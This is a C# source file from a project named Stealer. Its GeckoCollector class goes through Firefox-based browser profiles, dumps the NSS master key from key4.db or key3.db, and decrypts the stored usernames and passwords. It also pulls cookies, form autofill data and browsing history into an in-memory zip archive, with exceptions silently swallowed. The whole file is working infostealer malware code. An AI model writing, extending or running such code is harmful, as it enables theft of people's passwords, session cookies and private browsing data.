using System;
using System.Collections.Concurrent;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Stealer.Utils;
using Stealer.Crypto;

namespace Stealer.Collectors
{
    public class GeckoCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            var stats = new ConcurrentBag<string>();

            foreach (var browserPath in BrowserPaths.GeckoBrowsers)
            {
                try
                {
                    if (!Directory.Exists(browserPath))
                        continue;

                    string browserName = BrowserPaths.GetBrowserName(browserPath);

                    // Собираем все профили
                    foreach (string profileDir in Directory.GetDirectories(browserPath))
                    {
                        string profileName = Path.GetFileName(profileDir);

                        CollectProfile(zip, stats, profileDir, browserName, profileName);
                    }
                }
                catch
                {
                }
            }
        }

        private static void CollectProfile(InMemoryZip zip, ConcurrentBag<string> stats, 
            string profileDir, string browserName, string profileName)
        {
            try
            {
                int passwordCount = 0;
                int cookieCount = 0;
                int autofillCount = 0;
                int historyCount = 0;

                // Passwords - full decryption
                passwordCount = CollectPasswords(zip, profileDir, browserName, profileName);

                // Cookies
                string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                if (File.Exists(cookiesPath))
                {
                    cookieCount += CollectCookies(zip, cookiesPath, browserName, profileName);
                }

                // Autofill
                string formHistoryPath = Path.Combine(profileDir, "formhistory.sqlite");
                if (File.Exists(formHistoryPath))
                {
                    autofillCount += CollectAutofill(zip, formHistoryPath, browserName, profileName);
                }

                // History
                string historyPath = Path.Combine(profileDir, "places.sqlite");
                if (File.Exists(historyPath))
                {
                    historyCount += CollectHistory(zip, historyPath, browserName, profileName);
                }

                if (passwordCount > 0 || cookieCount > 0 || autofillCount > 0 || historyCount > 0)
                {
                    stats.Add($"[{browserName}] {profileName}:");
                    if (passwordCount > 0) stats.Add($"  Passwords: {passwordCount}");
                    if (cookieCount > 0) stats.Add($"  Cookies: {cookieCount}");
                    if (autofillCount > 0) stats.Add($"  Autofill: {autofillCount}");
                    if (historyCount > 0) stats.Add($"  History: {historyCount}");
                    stats.Add("");
                }
            }
            catch
            {
            }
        }

        private static int CollectPasswords(InMemoryZip zip, string profileDir, string browserName, string profileName)
        {
            try
            {
                string loginsPath = Path.Combine(profileDir, "logins.json");
                if (!File.Exists(loginsPath))
                    return 0;

                string key4Path = Path.Combine(profileDir, "key4.db");
                string key3Path = Path.Combine(profileDir, "key3.db");

                byte[] masterKey = null;

                if (File.Exists(key4Path))
                {
                    masterKey = NssDumpMasterKey.Key4Database(key4Path);
                }
                else if (File.Exists(key3Path))
                {
                    masterKey = NssDumpMasterKey.Key3Database(key3Path);
                }

                if (masterKey == null)
                    return 0;

                string text = File.ReadAllText(loginsPath);
                if (string.IsNullOrEmpty(text))
                    return 0;

                MatchCollection matchCollection = Regex.Matches(text, 
                    "\"hostname\":\\s*\"(.*?)\".*?\"encryptedUsername\":\\s*\"(.*?)\".*?\"encryptedPassword\":\\s*\"(.*?)\"", 
                    RegexOptions.Singleline);

                if (matchCollection.Count == 0)
                    return 0;

                var lines = new ConcurrentBag<string>();
                Asn1Der asn1Der = new Asn1Der();

                foreach (Match match in matchCollection)
                {
                    try
                    {
                        string hostname = match.Groups[1].Value;
                        string encryptedUsername = match.Groups[2].Value;
                        string encryptedPassword = match.Groups[3].Value;

                        byte[] toParse = Convert.FromBase64String(encryptedUsername);
                        byte[] toParse2 = Convert.FromBase64String(encryptedPassword);

                        Asn1DerObject asn1DerObject = asn1Der.Parse(toParse);
                        Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse2);

                        byte[] data = asn1DerObject.Objects[0].Objects[1].Objects[1].Data;
                        byte[] data2 = asn1DerObject.Objects[0].Objects[1].Objects[0].Data;
                        byte[] data3 = asn1DerObject2.Objects[0].Objects[1].Objects[1].Data;
                        byte[] data4 = asn1DerObject2.Objects[0].Objects[1].Objects[0].Data;

                        string username = TripleDes.DecryptStringDesCbc(masterKey, data, data2);
                        string password = TripleDes.DecryptStringDesCbc(masterKey, data3, data4);

                        username = string.IsNullOrEmpty(username) ? "" : Regex.Replace(username, "[^\\u0020-\\u007F]", "");
                        password = string.IsNullOrEmpty(password) ? "" : Regex.Replace(password, "[^\\u0020-\\u007F]", "");

                        if (!string.IsNullOrEmpty(hostname) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                        {
                            lines.Add($"Hostname: {hostname}\nUsername: {username}\nPassword: {password}\n\n");
                        }
                    }
                    catch { }
                }

                if (lines.Count > 0)
                {
                    zip.AddTextFile($"Browsers/{browserName}/Passwords_{profileName}.txt", string.Join("", lines));
                    return lines.Count;
                }

                return 0;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectCookies(InMemoryZip zip, string dbPath, string browserName, string profileName)
        {
            try
            {
                var cookies = new ConcurrentBag<string>();
                int count = 0;

                SQLiteParser parser = null;
                try
                {
                    parser = SQLiteParser.ReadTable(dbPath, "moz_cookies");
                }
                catch
                {
                }

                if (parser == null)
                    return 0;

                int colHost = parser.GetFieldIndex("host");
                int colName = parser.GetFieldIndex("name");
                int colValue = parser.GetFieldIndex("value");
                int colPath = parser.GetFieldIndex("path");
                int colExpiry = parser.GetFieldIndex("expiry");
                int colSecure = parser.GetFieldIndex("isSecure");
                if (colSecure == -1) colSecure = parser.GetFieldIndex("is_secure");
                int colHttpOnly = parser.GetFieldIndex("isHttpOnly");
                if (colHttpOnly == -1) colHttpOnly = parser.GetFieldIndex("is_httponly");

                if (colHost == -1 || colName == -1)
                    return 0;

                int rowCount = parser.GetRowCount();

                for (int i = 0; i < rowCount; i++)
                {
                    try
                    {
                        string host = colHost >= 0 ? (parser.GetValue(i, colHost) ?? "") : "";
                        string name = colName >= 0 ? (parser.GetValue(i, colName) ?? "") : "";
                        string value = colValue >= 0 ? (parser.GetValue(i, colValue) ?? "") : "";
                        string path = colPath >= 0 ? (parser.GetValue(i, colPath) ?? "") : "/";
                        string expiry = colExpiry >= 0 ? (parser.GetValue(i, colExpiry) ?? "0") : "0";
                        string isSecure = colSecure >= 0 ? (parser.GetValue(i, colSecure) ?? "0") : "0";
                        string isHttpOnly = colHttpOnly >= 0 ? (parser.GetValue(i, colHttpOnly) ?? "0") : "0";

                        if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(name))
                            continue;

                        if (string.IsNullOrEmpty(value))
                            continue;

                        string httpOnlyStr = (isHttpOnly == "1") ? "TRUE" : "FALSE";
                        string secureStr = (isSecure == "1") ? "TRUE" : "FALSE";
                        cookies.Add($"{host}\t{httpOnlyStr}\t{path}\t{secureStr}\t{expiry}\t{name}\t{value}");
                        count++;
                    }
                    catch { }
                }

                if (cookies.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/Cookies_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", cookies));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectAutofill(InMemoryZip zip, string dbPath, string browserName, string profileName)
        {
            try
            {
                var autofills = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "moz_formhistory");

                if (parser != null)
                {
                    int colFieldname = parser.GetFieldIndex("fieldname");
                    if (colFieldname == -1) colFieldname = 0;
                    int colValue = parser.GetFieldIndex("value");
                    if (colValue == -1) colValue = 1;

                    for (int i = 0; i < parser.GetRowCount(); i++)
                    {
                        try
                        {
                            string fieldname = parser.GetValue(i, colFieldname) ?? "";
                            string value = parser.GetValue(i, colValue) ?? "";

                            if (!string.IsNullOrEmpty(fieldname) && !string.IsNullOrEmpty(value))
                            {
                                autofills.Add($"Field: {fieldname}\nValue: {value}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (autofills.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/Autofill_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", autofills));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectHistory(InMemoryZip zip, string dbPath, string browserName, string profileName)
        {
            try
            {
                var history = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "moz_places");

                if (parser != null)
                {
                    int colUrl = parser.GetFieldIndex("url");
                    if (colUrl == -1) colUrl = 0;
                    int colTitle = parser.GetFieldIndex("title");
                    if (colTitle == -1) colTitle = 1;
                    int colVisitCount = parser.GetFieldIndex("visit_count");
                    if (colVisitCount == -1) colVisitCount = 3;

                    int maxRows = Math.Min(parser.GetRowCount(), 1000);

                    for (int i = 0; i < maxRows; i++)
                    {
                        try
                        {
                            string url = parser.GetValue(i, colUrl) ?? "";
                            string title = parser.GetValue(i, colTitle) ?? "";
                            string visitCount = parser.GetValue(i, colVisitCount) ?? "0";

                            if (!string.IsNullOrEmpty(url))
                            {
                                history.Add($"URL: {url}\nTitle: {title}\nVisits: {visitCount}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (history.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/History_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", history));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }
    }
}
